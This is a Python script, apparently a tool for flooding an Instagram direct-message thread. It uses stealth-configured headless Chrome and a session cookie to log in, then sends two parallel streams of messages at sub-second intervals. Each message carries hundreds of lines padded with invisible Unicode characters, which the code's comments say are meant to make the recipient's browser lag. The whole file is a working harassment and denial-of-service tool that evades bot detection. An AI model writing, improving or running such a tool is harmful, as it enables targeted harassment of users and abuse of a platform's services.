# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-LOCK V35)
# 📅 STATUS: SERVER-BYPASS | 4-AGENT TOTAL | AWS-CPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.2, 0.5)    # ✅ Slower burst prevents the "Invisible" Shadow-Ban
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_visible_lock_payload():
    """Generates a visible branded payload with hidden layout-lag code."""
    u_id = random.randint(1000, 9999)
    # \u2060 = Word Joiner (Invisible but forces layout math)
    # \u200B = Zero Width Space (Invisible but forces wrap checks)
    glue, brk = "\u2060", "\u200B"
    
    # 👑 THE BRANDING (This is what will be visible)
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE:{u_id}]"
    
    body = []
    # 350 lines of invisible math
    for i in range(350):
        # We sandwich the visible name between thousands of invisible joiners
        # The server sees 'PRAVEER PAPA', but the browser sees a 10,000px wide line.
        line = f"PRAVEER PAPA {i} ON TOP 🌙{glue*20}{brk*10}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            while True:
                payload = get_visible_lock_payload()
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
                    time.sleep(0.5) # ✅ Small delay to ensure server registration
                    box.send_keys(Keys.ENTER)
                    
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Visible Strike ({GLOBAL_SENT})")
                except:
                    break 

                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
